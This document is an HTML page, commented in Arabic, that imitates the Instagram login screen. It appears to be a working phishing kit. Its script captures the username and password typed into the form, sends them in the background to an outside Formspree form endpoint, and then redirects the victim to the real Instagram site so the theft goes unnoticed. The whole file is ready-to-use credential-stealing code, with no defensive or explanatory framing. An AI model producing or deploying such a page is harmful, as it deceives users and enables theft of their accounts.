<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fafafa; margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { font-size: 38px; font-style: italic; margin-bottom: 30px; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: #fff; border: none; border-radius: 6px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .divider { margin: 20px 0; font-size: 13px; color: #8e8e8e; }
        .footer { margin-top: 15px; border: 1px solid #dbdbdb; background: #fff; width: 350px; padding: 20px; text-align: center; font-size: 14px; }
    </style>
</head>
<body>

    <div class="box">
        <div class="logo">Instagram</div>

        <form id="loginForm">
            <input type="text" name="User" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="Pass" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>

        <div class="divider">──────── OR ────────</div>
        <div style="color:#385185; font-weight:bold; font-size:14px;">Log in with Facebook</div>
    </div>

    <div class="footer">Don't have an account? <span style="color: #0095f6; font-weight: bold;">Sign up</span></div>

    <script>
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', function(e) {
            e.preventDefault(); // منع الصفحة من الانتعاش أو إظهار رسالة Thanks

            const formData = new FormData(form);

            // إرسال البيانات للرابط في الخلفية
            fetch('https://formspree.io/f/mdakqgez', {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            }).finally(() => {
                // بعد الإرسال (نجح أو فشل) سينتقل فوراً لإنستغرام
                window.location.href = "https://www.instagram.com/";
            });
        });
    </script>

</body>
</html>
